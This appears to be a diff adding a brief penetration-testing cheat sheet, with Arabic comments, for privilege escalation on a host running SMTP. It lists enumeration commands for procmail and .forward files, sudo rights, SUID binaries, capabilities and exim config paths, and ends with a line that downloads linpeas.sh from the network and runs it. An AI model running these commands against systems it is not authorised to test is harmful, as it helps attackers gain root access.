@@ -1,0 +1,9 @@
+# SMTP PrivEsc (25)
+# ابحث عن سكربتات mail processing قابلة للكتابة (procmail/maildrop)
+grep -R "procmail" /etc /home 2>/dev/null     # قواعد تنفيذ بريدية
+find / -name ".forward" -o -name ".procmailrc" 2>/dev/null   # تنفيذ أوامر عند وصول بريد
+sudo -l                                         # sudo
+find / -perm -4000 -type f 2>/dev/null          # SUID
+getcap -r / 2>/dev/null                          # قدرات
+strings /usr/sbin/exim* 2>/dev/null | grep -i cfg   # مسارات إعداد قد تكون قابلة للكتابة
+wget https://.../linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
